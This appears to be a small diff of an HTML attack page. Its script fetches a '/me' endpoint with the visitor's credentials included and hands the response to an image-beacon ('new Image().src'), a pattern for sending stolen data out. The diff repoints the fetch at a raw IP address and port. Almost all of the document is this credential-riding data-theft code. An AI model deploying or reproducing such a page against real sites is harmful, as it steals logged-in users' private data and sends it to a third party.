@@ -2,7 +2,7 @@
 <html>
 <body>
 <script>
-fetch('/me', { credentials: 'include' })
+fetch('http://223.6.249.127:25348/me', { credentials: 'include' })
   .then(r => r.text())
   .then(d => {
     new Image().src =
@@ -11,3 +11,4 @@ fetch('/me', { credentials: 'include' })
 </script>
 </body>
 </html>
+
